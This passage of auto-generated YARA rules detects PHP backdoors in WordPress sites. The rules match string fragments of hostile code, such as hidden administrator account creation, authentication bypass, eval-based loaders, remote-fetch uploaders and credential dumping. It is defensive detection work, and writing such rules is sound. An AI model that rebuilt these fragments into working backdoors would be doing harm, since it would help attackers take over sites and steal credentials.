    strings:
        $ps0 = "require('./wp-blog-header.php');"
    condition:
        $ps0
}

private rule PR03710 : trigger
{
    strings:
        $ps0 = "echo 'WordPress Login Successful"
    condition:
        $ps0
}

private rule PR03711 : trigger
{
    strings:
        $ps0 = "$users = get_users(array('role' => 'administrator'));"
    condition:
        $ps0
}

rule php_backdoor_wpadmin_bypass_006 : backdoor
{
    strings:
        $trigger = "die();"
    condition:
        $trigger and PR01452 and PR03709 and PR03710 and PR03711
}

private rule PR03712 : trigger
{
    strings:
        $ps0 = "$redirect_to = user_admin_url();"
    condition:
        $ps0
}

private rule PR03713 : trigger
{
    strings:
        $ps0 = "if($_REQUEST['pass']"
    condition:
        $ps0
}

rule php_backdoor_wpadmin_bypass_007 : backdoor
{
    strings:
        $trigger = "@unlink(__FILE__);"
    condition:
        $trigger and PR03712 and PR03713
}

private rule PR03714 : trigger
{
    strings:
        $ps0 = "include 'wp-config.php';"
    condition:
        $ps0
}

private rule PR03715 : trigger
{
    strings:
        $ps0 = "$redirect_to=user_admin_url();"
    condition:
        $ps0
}

private rule PR03716 : trigger
{
    strings:
        $ps0 = "$user = get_user_by( 'id', $_GET['id'] );"
    condition:
        $ps0
}

rule php_backdoor_wpadmin_bypass_009 : backdoor
{
    strings:
        $trigger = "$user_id = $_GET['id'];"
    condition:
        $trigger and PR03714 and PR03715 and PR03716
}

private rule PR03717 : trigger
{
    strings:
        $ps0 = "function send_rms_curl_request("
    condition:
        $ps0
}

rule php_backdoor_wpadmin_bypass_010 : backdoor
{
    strings:
        $trigger = "explode("
    condition:
        $trigger and PR03717 and PR01431
}

// MANUAL FIX NECESSARY
rule php_backdoor_wpadmin_bypass_013 : backdoor
{
    strings:
        $trigger = "wp_set_auth_cookie("
        $php_backdoor_wpadmin_bypass_013_r0 = /include..wp-load.php.\);\s*\$\w+\s*=\s*get_users\(array\(.role.=>.administrator.\)\);\s*wp_set_auth_cookie.\$\w+\[\d\]->ID\);/
    condition:
        $trigger and PR02534 and $php_backdoor_wpadmin_bypass_013_r0
}

private rule PR03718 : trigger
{
    strings:
        $ps0 = "eJwVmsWOxNiWRT"
    condition:
        $ps0
}

rule php_backdoor_wpadmin_bypass_014 : backdoor
{
    strings:
        $trigger = "\";eval("
    condition:
        $trigger and PR03718
}

private rule PR03719 : trigger
{
    strings:
        $ps0 = ");error_reporting(0);set_time_limit(0);require(@$_SERVER[$O["
    condition:
        $ps0
}

private rule PR03720 : trigger
{
    strings:
        $ps0 = "else {wp_redirect(get_bloginfo($"
    condition:
        $ps0
}

rule php_backdoor_wpadmin_bypass_017 : backdoor
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR03719 and PR03720 and PR00397
}

private rule PR03721 : trigger
{
    strings:
        $ps0 = "get_users(['role' => 'administrator"
    condition:
        $ps0
}

private rule PR03722 : trigger
{
    strings:
        $ps0 = "wp_redirect(get_admin_url())"
    condition:
        $ps0
}

private rule PR03723 : trigger
{
    strings:
        $ps0 = "wp_set_auth_cookie($"
    condition:
        $ps0
}

private rule PR03724 : trigger
{
    strings:
        $ps0 = "user_can"
    condition:
        $ps0
}

rule php_backdoor_wpadmin_bypass_018 : backdoor
{
    strings:
        $trigger = "require_once"
    condition:
        $trigger and PR03721 and PR03722 and PR03723 and PR03724
}

rule php_backdoor_wpposts_001 : backdoor
{
    strings:
        $trigger = "define('SHELL_PASSWORD', $hashed_password);"
    condition:
        $trigger and PR00013
}

private rule PR03725 : trigger
{
    strings:
        $ps0 = "post_status='publish"
    condition:
        $ps0
}

private rule PR03726 : trigger
{
    strings:
        $ps0 = "stripslashes(urldecode($_POST["
    condition:
        $ps0
}

rule php_backdoor_wpposts_002 : backdoor
{
    strings:
        $trigger = "@include"
    condition:
        $trigger and PR03725 and PR02544 and PR03726
}

private rule PR03727 : trigger
{
    strings:
        $ps0 = "= wp_insert_post( $"
    condition:
        $ps0
}

private rule PR03728 : trigger
{
    strings:
        $ps0 = "include(\"wp-config.php\");"
    condition:
        $ps0
}

rule php_backdoor_wpposts_003 : backdoor
{
    strings:
        $trigger = "$_GET["
    condition:
        $trigger and PR03727 and PR03728
}

private rule PR03729 : trigger
{
    strings:
        $ps0 = "$wpdb->get_results("
    condition:
        $ps0
}

private rule PR03730 : trigger
{
    strings:
        $ps0 = "Set post_content"
    condition:
        $ps0
}

rule php_backdoor_wpposts_004 : backdoor
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR03729 and PR00046 and PR03730
}

private rule PR03731 : trigger
{
    strings:
        $ps0 = "(wp_update_post(wp_slash($updPost)))"
    condition:
        $ps0
}

rule php_backdoor_wpposts_005 : backdoor
{
    strings:
        $trigger = "json_decode(stripslashes($_POST["
    condition:
        $trigger and PR01760 and PR01179 and PR03731
}

rule php_backdoor_wptemp_001 : backdoor
{
    strings:
        $trigger = "chmod($_SERVER[\"DOCUMENT_ROOT\"].\"/wp-temp.php\", 0644);"
    condition:
        $trigger and PR00435
}

private rule PR03732 : trigger
{
    strings:
        $ps0 = "fwrite($fp,file_get_contents(base64_decode(rawurldecode"
    condition:
        $ps0
}

rule php_backdoor_wpuploader_001 : backdoor
{
    strings:
        $trigger = "fopen"
    condition:
        $trigger and PR01392 and PR03732
}

private rule PR03733 : trigger
{
    strings:
        $ps0 = "$wp=\"abcdefghijklmnopqrstuvwxyz(*_;/.)\";"
    condition:
        $ps0
}

rule php_backdoor_wpuploader_002 : backdoor
{
    strings:
        $trigger = "@$wordpress($wp["
    condition:
        $trigger and PR03733 and PR00719
}

rule php_backdoor_wpuploader_003 : backdoor
{
    strings:
        $trigger = "if (isset($_POST['upload_plugin']) || isset($_POST['upload_theme'])"
    condition:
        $trigger
}

rule php_backdoor_wpuploader_004 : backdoor
{
    strings:
        $trigger = "{echo 'ok:'.'1';unlink(__FILE__); exit;}"
    condition:
        $trigger and PR00435
}

rule php_backdoor_wp_addaction_001 : backdoor
{
    strings:
        $trigger = ");echo \"$data\";}}add_action('wp_"
    condition:
        $trigger
}

rule php_backdoor_wp_addaction_001_02 : backdoor
{
    strings:
        $trigger = "wp_create_user('wordpress"
    condition:
        $trigger and PR02092
}

rule php_backdoor_wp_addaction_001_03 : backdoor
{
    strings:
        $trigger = "if(!username_exists('wordpress"
    condition:
        $trigger and PR02092
}

rule php_backdoor_wp_addaction_002 : backdoor
{
    strings:
        $trigger = "(){if(is_category()||is_front_page()||is_"
    condition:
        $trigger and PR02062 and PR01021
}

rule php_backdoor_wp_adminadd_002 : backdoor
{
    strings:
        $trigger = "$unme=\"support_users_v-\".rand(100,999);"
    condition:
        $trigger and PR01693
}

// MANUAL FIX NECESSARY
private rule PR03734 : trigger
{
    strings:
        $ps0 = "username_exists"
    condition:
        $ps0
}

private rule PR03735 : trigger
{
    strings:
        $ps0 = "$user->set_role( 'administrator' );"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_003 : backdoor
{
    strings:
        $trigger = "pass"
        $php_backdoor_wp_adminadd_003_r0 = /add_action\([\s]*.init.[\s]*,[^;]+\);[\s]*function ([\w]+)\(\)[\s]*\{[\s]*\$[\w]+[\s]*[^;]+;[\s]*\$[\w]+[\s]*=[^;]+;[\s]*\$[\w]+[\s]*=[^;]+;[\s]*[^{]+\{[\s]*\$[\w]+[\s]*=[\s]*wp_create_user[^\}]+->set_role\([\s]*.administrator.[\s]*\);[\s\}]+/
    condition:
        $trigger and PR03734 and PR03735 and $php_backdoor_wp_adminadd_003_r0
}

private rule PR03736 : trigger
{
    strings:
        $ps0 = "backdoor"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_004 : backdoor
{
    strings:
        $trigger = "$user_id=wp_create_user"
    condition:
        $trigger and PR03736 and PR02092
}

private rule PR03737 : trigger
{
    strings:
        $ps0 = "get_random_name()"
    condition:
        $ps0
}

private rule PR03738 : trigger
{
    strings:
        $ps0 = "$wp_cfgs = $joomla_cfgs = array();"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_006 : backdoor
{
    strings:
        $trigger = "mysql"
    condition:
        $trigger and PR03737 and PR03738
}

private rule PR03739 : trigger
{
    strings:
        $ps0 = "capabilities', 'a:1:{s:13:\\\"administrator\\\";s:1:\\\"1\\\";"
    condition:
        $ps0
}

private rule PR03740 : trigger
{
    strings:
        $ps0 = "$wpdb->query( \"INSERT INTO `\" . $db_prefix . \"users` (`ID`, `user_login`, `user_pass`"
    condition:
        $ps0
}

private rule PR03741 : trigger
{
    strings:
        $ps0 = "global $wpdb"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_007 : backdoor
{
    strings:
        $trigger = "require_once"
    condition:
        $trigger and PR03739 and PR03740 and PR03741
}

// MANUAL FIX NECESSARY
rule php_backdoor_wp_adminadd_008 : backdoor
{
    strings:
        $trigger = "select * from \".$prefix.\"options where option_name='siteurl'"
        $php_backdoor_wp_adminadd_008_r0 = /update[\s]*.\.\$prefix\..users[\s]*set[\s]*user_login[\s]*=[\s]*.[\w]+.[\s]*,user_pass[\s]*=[\s]*.[\w]+..\);/
    condition:
        $trigger and PR01431 and $php_backdoor_wp_adminadd_008_r0
}

private rule PR03742 : trigger
{
    strings:
        $ps0 = "backdoor'] == 'go"
    condition:
        $ps0
}

private rule PR03743 : trigger
{
    strings:
        $ps0 = "$user_id = wp_create_user("
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_009 : backdoor
{
    strings:
        $trigger = "$_GET['backdoor']"
    condition:
        $trigger and PR03742 and PR01338 and PR01346 and PR03743
}

private rule PR03744 : trigger
{
    strings:
        $ps0 = "add_action('wp_head', 'wploop_backdoor"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_011 : backdoor
{
    strings:
        $trigger = "$_GET['backdoor']"
    condition:
        $trigger and PR01338 and PR03744 and PR01346 and PR03743
}

private rule PR03745 : trigger
{
    strings:
        $ps0 = "$link_shellcode = $_POST[\"secretLink\"];"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_012 : backdoor
{
    strings:
        $trigger = "new WP_User($"
    condition:
        $trigger and PR00435 and PR01529 and PR03745
}

private rule PR03746 : trigger
{
    strings:
        $ps0 = "new WP_User($"
    condition:
        $ps0
}

private rule PR03747 : trigger
{
    strings:
        $ps0 = "$link_shellcode"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_012_02 : backdoor
{
    strings:
        $trigger = "$_POST['target'], $_SERVER[\"DOCUMENT_ROOT\"]"
    condition:
        $trigger and PR00435 and PR03746 and PR03747
}

private rule PR03748 : trigger
{
    strings:
        $ps0 = "function my_back()"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_013 : backdoor
{
    strings:
        $trigger = "$_GET['back"
    condition:
        $trigger and PR00039 and PR03748
}

private rule PR03749 : trigger
{
    strings:
        $ps0 = "echo $siteurl->option_value.'|'.$user_loginv"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_014 : backdoor
{
    strings:
        $trigger = "new WP_User("
    condition:
        $trigger and PR03749
}

private rule PR03750 : trigger
{
    strings:
        $ps0 = "$user_id = wp_create_user( $newusername, $newpassword, $newemail);"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_015 : backdoor
{
    strings:
        $trigger = "shell_exec('rm -f "
    condition:
        $trigger and PR03750 and PR01338 and PR01346
}

// MANUAL FIX NECESSARY
private rule PR03751 : trigger
{
    strings:
        $ps0 = "$user_id = wp_create_user( $"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_019 : backdoor
{
    strings:
        $trigger = "new WP_User("
        $php_backdoor_wp_adminadd_019_r0 = /!email_exists\(\$[\w]+\)[\s]*\)[\s]*\{[\s]*[^\(]*\$user_id[\s]*=[\s]*wp_create_user[\s]*\([\s]*\$[\w]+[^\)]+\);[\s]*if[\s]*\([\s]*is_int\([\s]*\$user_id\)[\s]*\)[\s]*\{[\s]*\$wp_user_object[\s]*=[\s]*new WP_User\(\$user_id\);[\s]*\$wp_user_object->set_role\([\s]*.administrator.[\s]*\);[\s]*echo[^;]+;([\s}]+else[\s]*\{[\s]*echo[^;]+;){3}/
    condition:
        $trigger and PR03751 and $php_backdoor_wp_adminadd_019_r0
}

private rule PR03752 : trigger
{
    strings:
        $ps0 = "$admin_list[] = $r['user_login'].' / '.$r['user_pass'];"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_021 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR03752 and PR01431
}

private rule PR03753 : trigger
{
    strings:
        $ps0 = "WordPress_secret"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_022 : backdoor
{
    strings:
        $trigger = "$user_id = wp_create_user("
    condition:
        $trigger and PR01338 and PR03753 and PR01346
}

// MANUAL FIX NECESSARY
private rule PR03754 : trigger
{
    strings:
        $ps0 = "add_action"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_023 : backdoor
{
    strings:
        $trigger = "new WP_User("
        $php_backdoor_wp_adminadd_023_r0 = /add_action\([^\)]+\);[\s]*function [\w]+\(\)[\s]*\{[\s]*\$username[^;]+;[\s]*\$password[^;]+;[\s]*\$email_address[^;]+;[\s]*if[\s]*\([\s]*isset[\s]*\([\s]*\$username[^\{]+\{[\s]*if[\s]*\([\s]*![\s]*username_exists[^\{]+\{[\s]*\$user_id[\s]*=[\s]*wp_create_user[^\}]+\$wp_user_object->set_role\([\s]*.administrator/
    condition:
        $trigger and PR03754 and PR03707 and $php_backdoor_wp_adminadd_023_r0
}

private rule PR03755 : trigger
{
    strings:
        $ps0 = "]){function hide_plugins($"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_023_02 : backdoor
{
    strings:
        $trigger = "]);function wpdaxue(){$"
    condition:
        $trigger and PR03755 and PR00675
}

// MANUAL FIX NECESSARY
rule php_backdoor_wp_adminadd_025 : backdoor
{
    strings:
        $trigger = "new WP_User("
        $php_backdoor_wp_adminadd_025_r0 = /\$[\w]+[\s]*=[\s]*wp_create_user\(.[\w]+.,[\s]*.[\w]+.,[\s]*.[^;]+\);[\s]*\$[\w]+[\s]*=[\s]*new[\s]*WP_User\(\$[\w]+\);[\s]*\$[\w]+[\s]*->[\s]*set_role\(.administrator.\);/
    condition:
        $trigger and PR03707 and $php_backdoor_wp_adminadd_025_r0
}

private rule PR03756 : trigger
{
    strings:
        $ps0 = "$user = new WP_User($"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_026 : backdoor
{
    strings:
        $trigger = "(!username_exists("
    condition:
        $trigger and PR03736 and PR03756 and PR02092
}

private rule PR03757 : trigger
{
    strings:
        $ps0 = "!username_exists($username)"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_027 : backdoor
{
    strings:
        $trigger = "$user_id = wp_create_user("
    condition:
        $trigger and PR03757 and PR01338 and PR01346
}

rule php_backdoor_wp_adminadd_029 : backdoor
{
    strings:
        $trigger = "$user_id = wp_create_user( $_GET['name'], $_GET['secret'] );"
    condition:
        $trigger and PR01346
}

rule php_backdoor_wp_adminadd_030 : backdoor
{
    strings:
        $trigger = "hide_plugins($plugins){unset("
    condition:
        $trigger and PR03751 and PR01346
}

private rule PR03758 : trigger
{
    strings:
        $ps0 = "function generatePassword"
    condition:
        $ps0
}

private rule PR03759 : trigger
{
    strings:
        $ps0 = "%administrator%"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_031 : backdoor
{
    strings:
        $trigger = "$sql = \"INSERT INTO \". $tbl_pre . \"users(ID, user_login, user_pass, user_nicename"
    condition:
        $trigger and PR00732 and PR03758 and PR03759
}

private rule PR03760 : trigger
{
    strings:
        $ps0 = "require_once(realpath($_SERVER[\"DOCUMENT_ROOT\"]) . \"/wp-load.php\");"
    condition:
        $ps0
}

private rule PR03761 : trigger
{
    strings:
        $ps0 = "$user_id = wp_create_user($user, $pass, $email);"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_032 : backdoor
{
    strings:
        $trigger = "function add_admin_account() {"
    condition:
        $trigger and PR03760 and PR03707 and PR03761 and PR01346
}

private rule PR03762 : trigger
{
    strings:
        $ps0 = "if(filter_input(INPUT_GET,"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_033 : backdoor
{
    strings:
        $trigger = "require($_SERVER"
    condition:
        $trigger and PR03762 and PR01179
}

// MANUAL FIX NECESSARY
rule php_backdoor_wp_adminadd_033_02 : backdoor
{
    strings:
        $trigger = "FILTER_SANITIZE_NUMBER_INT"
        $php_backdoor_wp_adminadd_033_02_r0 = /function [\w]+\(\)[\s]*\{[\s]*if[\s]*\([\s]*filter_input[\s]*\([\s]*INPUT_GET,[^=]+FILTER_SANITIZE_NUMBER_INT\)[\s]*!=[\s]*false\)[\s]*\{[^\}]+[\s\}]+/
    condition:
        $trigger and PR03754 and PR03762 and PR01179 and $php_backdoor_wp_adminadd_033_02_r0
}

rule php_backdoor_wp_adminadd_033_03 : backdoor
{
    strings:
        $trigger = "function enqueue_locals"
    condition:
        $trigger and PR03754 and PR03762 and PR01179
}

// MANUAL FIX NECESSARY
rule php_backdoor_wp_adminadd_033_04 : backdoor
{
    strings:
        $trigger = "enqueue_locals"
        $php_backdoor_wp_adminadd_033_04_r0 = /add_action\([^\)]+enqueue_locals[^\)]+\);/
    condition:
        $trigger and PR03754 and PR03762 and PR01179 and $php_backdoor_wp_adminadd_033_04_r0
}

private rule PR03763 : trigger
{
    strings:
        $ps0 = "echo \"Success\";"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_033_05 : backdoor
{
    strings:
        $trigger = "rray"
    condition:
        $trigger and PR03763 and PR03762
}

// MANUAL FIX NECESSARY
rule php_backdoor_wp_adminadd_033_06 : backdoor
{
    strings:
        $trigger = "FILTER_SANITIZE_NUMBER_INT"
        $php_backdoor_wp_adminadd_033_06_r0 = /add_action\([\s]*.wp_loaded.,[^;]+\);/
    condition:
        $trigger and PR03754 and PR03762 and PR01179 and $php_backdoor_wp_adminadd_033_06_r0
}

private rule PR03764 : trigger
{
    strings:
        $ps0 = "'wpdaxue'"
    condition:
        $ps0
}

private rule PR03765 : trigger
{
    strings:
        $ps0 = "function wpdaxue"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_034 : backdoor
{
    strings:
        $trigger = "$user_id = wp_create_user("
    condition:
        $trigger and PR03764 and PR03765 and PR01338 and PR01346
}

rule php_backdoor_wp_adminadd_034_02 : backdoor
{
    strings:
        $trigger = "$user_id = wp_create_user("
    condition:
        $trigger and PR01392 and PR03765 and PR01338 and PR01346
}

rule php_backdoor_wp_adminadd_034_03 : backdoor
{
    strings:
        $trigger = "unset( $plugins["
    condition:
        $trigger and PR03765 and PR01338 and PR01346 and PR03743
}

rule php_backdoor_wp_adminadd_035 : backdoor
{
    strings:
        $trigger = "add_action( 'init', function () {"
    condition:
        $trigger and PR03751 and PR01346
}

// MANUAL FIX NECESSARY
rule php_backdoor_wp_adminadd_036 : backdoor
{
    strings:
        $trigger = "new WP_User("
        $php_backdoor_wp_adminadd_036_r0 = /add_action\([^;]+\);[\s]*function[\s]*[\w]+\(\)[\s]*\{[\s]*if[\s]*\([\s]*md5[\s]*\([\s]*\$_GET\[.[\w]+.\][\s]*\)[\s]*==/
    condition:
        $trigger and PR03754 and PR03707 and $php_backdoor_wp_adminadd_036_r0
}

rule php_backdoor_wp_adminadd_038 : backdoor
{
    strings:
        $trigger = ")=>base64_decode('bW9yZG9y'),base64_decode("
    condition:
        $trigger and PR01877
}

// MANUAL FIX NECESSARY
rule php_backdoor_wp_adminadd_039 : backdoor
{
    strings:
        $trigger = "pass"
        $php_backdoor_wp_adminadd_039_r0 = /wp_mail\([^;]+\);[\s]*\$[\w]+[\s]*=[\s]*wp_create_user/
    condition:
        $trigger and PR03734 and PR03735 and $php_backdoor_wp_adminadd_039_r0
}

rule php_backdoor_wp_adminadd_040 : backdoor
{
    strings:
        $trigger = "wp_set_current_user($unit->ID);"
    condition:
        $trigger and PR03762 and PR01179
}

// MANUAL FIX NECESSARY
rule php_backdoor_wp_adminadd_041 : backdoor
{
    strings:
        $trigger = "\\x69\\146\\50\\x21\\143\\x6c\\141\\163\\163\\137\\145\\170\\151\\x73"
        $php_backdoor_wp_adminadd_041_r0 = /<\?php[\s]*@?eval/
    condition:
        $trigger and PR00029 and $php_backdoor_wp_adminadd_041_r0
}

private rule PR03766 : trigger
{
    strings:
        $ps0 = "users set user_login='$"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_042 : backdoor
{
    strings:
        $trigger = "($_POST["
    condition:
        $trigger and PR01726 and PR03766 and PR00046
}

private rule PR03767 : trigger
{
    strings:
        $ps0 = "function wpb_admin_account() {"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_043 : backdoor
{
    strings:
        $trigger = "$user_id = wp_create_user("
    condition:
        $trigger and PR03767 and PR01338 and PR01346
}

private rule PR03768 : trigger
{
    strings:
        $ps0 = "if(filter_input(INPUT_GET, str_replace("
    condition:
        $ps0
}

private rule PR03769 : trigger
{
    strings:
        $ps0 = "array('role' => str_replace("
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_044 : backdoor
{
    strings:
        $trigger = "$a->roles)){"
    condition:
        $trigger and PR03768 and PR03769
}

private rule PR03770 : trigger
{
    strings:
        $ps0 = "(php_sapi_name() === 'cli')"
    condition:
        $ps0
}

private rule PR03771 : trigger
{
    strings:
        $ps0 = "wp_generate_password("
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_045 : backdoor
{
    strings:
        $trigger = "wp_create_user("
    condition:
        $trigger and PR01780 and PR03770 and PR03771
}

private rule PR03772 : trigger
{
    strings:
        $ps0 = "create_wp_admin_user($username"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_046 : backdoor
{
    strings:
        $trigger = "$user_id = wp_create_user("
    condition:
        $trigger and PR03772 and PR01338 and PR01346
}

rule php_backdoor_wp_adminadd_047 : backdoor
{
    strings:
        $trigger = "glob(\"$dir/*\");"
    condition:
        $trigger and PR03751 and PR01346
}

rule php_backdoor_wp_adminadd_048 : backdoor
{
    strings:
        $trigger = "f(filter_input(INPUT_GET, str_replace('-', '', '-ge"
    condition:
        $trigger and PR03768 and PR03769
}

private rule PR03773 : trigger
{
    strings:
        $ps0 = "if($key->roles[0] == 'administrator')"
    condition:
        $ps0
}

private rule PR03774 : trigger
{
    strings:
        $ps0 = "wp_set_current_user"
    condition:
        $ps0
}

rule php_backdoor_wp_adminadd_049 : backdoor
{
    strings:
        $trigger = "isset($_REQUEST["
    condition:
        $trigger and PR03773 and PR02543 and PR03774
}

rule php_backdoor_wp_adminadd_050 : backdoor
{
    strings:
        $trigger = "strpos($wp->query_vars['name'], stripcslashes(str_replace('"
    condition:
        $trigger and PR03769
}

rule php_backdoor_wp_adminadd_051 : backdoor
{
    strings:
        $trigger = "add_action('init', 'wpb_admin_account');"
    condition:
        $trigger
}

private rule PR03775 : trigger
{
    strings:
        $ps0 = "json_decode(base64_decode("
    condition:
        $ps0
}

rule php_backdoor_wp_jm_links_to_db_001 : backdoor
{
    strings:
        $trigger = "file_get_contents('http://'.$_POST['url'].'/link.php?key='.$_POST['key'].$parameters)"
    condition:
        $trigger and PR03775
}

rule php_backdoor_wp_login_001 : backdoor
{
    strings:
        $trigger = "if (isset($_POST[\"log\"]) && isset($_POST[\"pwd\"]))"
    condition:
        $trigger and PR00435
}

rule php_backdoor_wp_login_002 : backdoor
{
    strings:
        $trigger = "])){$user = get_user_by( 'id', $_REQUEST"
    condition:
        $trigger and PR01379 and PR03774
}

private rule PR03776 : trigger
{
    strings:
        $ps0 = "if ( stristr($cookie, 'wordpress_logged_in_')"
    condition:
        $ps0
}

rule php_backdoor_wp_login_003 : backdoor
{
    strings:
        $trigger = "(preg_match('/admin|wp-login.php|wp-admin|administrator/i',$_SERVER['REQUEST_URI'])"
    condition:
        $trigger and PR03776 and PR00265 and PR02163
}

private rule PR03777 : trigger
{
    strings:
        $ps0 = "substr(pack('H*', sha1($"
    condition:
        $ps0
}

rule php_backdoor_wp_login_005 : backdoor
{
    strings:
        $trigger = "(wp_check_password($password, $hash)){"
    condition:
        $trigger and PR03777
}

private rule PR03778 : trigger
{
    strings:
        $ps0 = "$user = get_userdata("
    condition:
        $ps0
}

private rule PR03779 : trigger
{
    strings:
        $ps0 = "wp_set_auth_cookie  ( $user->ID );"
    condition:
        $ps0
}

private rule PR03780 : trigger
{
    strings:
        $ps0 = "echo $message = \"Logged in successfully\";"
    condition:
        $ps0
}

rule php_backdoor_wp_login_007 : backdoor
{
    strings:
        $trigger = "include('wp-config.php');"
    condition:
        $trigger and PR03778 and PR03779 and PR03780
}

private rule PR03781 : trigger
{
    strings:
        $ps0 = "do_action('wp_login', $user_logins);"
    condition:
        $ps0
}

rule php_backdoor_wp_login_008 : backdoor
{
    strings:
        $trigger = "if(isset($_GET['cg'])){ $b = $_GET['cg']; }"
    condition:
        $trigger and PR03781
}

private rule PR03782 : trigger
{
    strings:
        $ps0 = "clean_user_cache($"
    condition:
        $ps0
}

private rule PR03783 : trigger
{
    strings:
        $ps0 = "user_admin_url();"
    condition:
        $ps0
}

private rule PR03784 : trigger
{
    strings:
        $ps0 = "->data->user_login;"
    condition:
        $ps0
}

rule php_backdoor_wp_login_009 : backdoor
{
    strings:
        $trigger = "get_user_by"
    condition:
        $trigger and PR01379 and PR03782 and PR03774 and PR03783 and PR03784
}

private rule PR03785 : trigger
{
    strings:
        $ps0 = "function hidden_user_query($user_search)"
    condition:
        $ps0
}

rule php_backdoor_wp_login_010 : backdoor
{
    strings:
        $trigger = "users.php?role=administrator"
    condition:
        $trigger and PR02092 and PR03785
}

private rule PR03786 : trigger
{
    strings:
        $ps0 = "http_build_query($"
    condition:
        $ps0
}

rule php_backdoor_wp_login_011 : backdoor
{
    strings:
        $trigger = "array('s' => wp_log_get_server_url()"
    condition:
        $trigger and PR01553 and PR01401 and PR03786
}

rule php_backdoor_wp_worm_001 : backdoor
{
    strings:
        $trigger = "get_option(\"_is_widget_active_\")"
    condition:
        $trigger
}

private rule PR03787 : trigger
{
    strings:
        $ps0 = "@eval(get_option('blogoption"
    condition:
        $ps0
}

rule php_backdoor_wp_worm_002 : backdoor
{
    strings:
        $trigger = "add_filter('the_content"
    condition:
        $trigger and PR03787
}

private rule PR03788 : trigger
{
    strings:
        $ps0 = "add_option('blogoption', $value, '', 'yes');"
    condition:
        $ps0
}

rule php_backdoor_wp_worm_002_02 : backdoor
{
    strings:
        $trigger = "add_action("
    condition:
        $trigger and PR03788
}

rule php_backdoor_wp_worm_002_03 : backdoor
{
    strings:
        $trigger = " _theme_setup()"
    condition:
        $trigger and PR03787
}

private rule PR03789 : trigger
{
    strings:
        $ps0 = "function createBrutePass($wordsList, $domain, $login, $startPass, $endPass)"
    condition:
        $ps0
}

rule php_backdoor_wp_worm_003 : backdoor
{
    strings:
        $trigger = "preg_replace"
    condition:
        $trigger and PR03789 and PR01401
}

private rule PR03790 : trigger
{
    strings:
        $ps0 = "\\'SYSTEM_LOGIN\\', \\'support@wordpress.org\\'"
    condition:
        $ps0
}

rule php_backdoor_wpsystemlogin_001 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03790
}

rule php_backdoor_wpuser_001 : backdoor
{
    strings:
        $trigger = "../wp-blog-header.php\");"
    condition:
        $trigger and PR01338 and PR01346
}

private rule PR03791 : trigger
{
    strings:
        $ps0 = "echo 'Successfully created new admin user. Now delete this file!'"
    condition:
        $ps0
}

private rule PR03792 : trigger
{
    strings:
        $ps0 = "if($_GET[adduser]"
    condition:
        $ps0
}

rule php_backdoor_wpuser_002 : backdoor
{
    strings:
        $trigger = "->set_role('administrator');"
    condition:
        $trigger and PR01346 and PR03791 and PR03792 and PR03750
}

private rule PR03793 : trigger
{
    strings:
        $ps0 = "echo 'before running the script. Set these variables and try again.';"
    condition:
        $ps0
}

rule php_backdoor_wpuser_002_02 : backdoor
{
    strings:
        $trigger = "->set_role('administrator');"
    condition:
        $trigger and PR01346 and PR03791 and PR03793 and PR03750
}

private rule PR03794 : trigger
{
    strings:
        $ps0 = "echo 'This user or email already exists. Nothing was done."
    condition:
        $ps0
}

rule php_backdoor_wpuser_003 : backdoor
{
    strings:
        $trigger = "->set_role('administrator');"
    condition:
        $trigger and PR01346 and PR03791 and PR03794 and PR03750
}

private rule PR03795 : trigger
{
    strings:
        $ps0 = "'user_email' => 'welcome@domain.com',"
    condition:
        $ps0
}

private rule PR03796 : trigger
{
    strings:
        $ps0 = "'user_login' => 'wp_dev"
    condition:
        $ps0
}

rule php_backdoor_wpuser_005 : backdoor
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR03795 and PR03796 and PR02574
}

private rule PR03797 : trigger
{
    strings:
        $ps0 = "table_schema=database() AND TABLE_NAME LIKE '%options';\";"
    condition:
        $ps0
}

rule php_backdoor_wpuser_006 : backdoor
{
    strings:
        $trigger = "$_GET["
    condition:
        $trigger and PR03797
}

private rule PR03798 : trigger
{
    strings:
        $ps0 = "'error: creating user '"
    condition:
        $ps0
}

rule php_backdoor_wpuser_008 : backdoor
{
    strings:
        $trigger = "INSERT INTO `wp_users` (`user_login`,`user_pass`,`user_email`,`display_name`"
    condition:
        $trigger and PR00732 and PR03798
}

private rule PR03799 : trigger
{
    strings:
        $ps0 = "getElementById('user"
    condition:
        $ps0
}

rule php_backdoor_wpuser_008_02 : backdoor
{
    strings:
        $trigger = "'Error: Creating to the account."
    condition:
        $trigger and PR00050 and PR03799
}

private rule PR03800 : trigger
{
    strings:
        $ps0 = "if(($user->id)>1){echo"
    condition:
        $ps0
}

private rule PR03801 : trigger
{
    strings:
        $ps0 = "wp_set_password($"
    condition:
        $ps0
}

rule php_backdoor_wpuser_009 : backdoor
{
    strings:
        $trigger = "wp-config.php"
    condition:
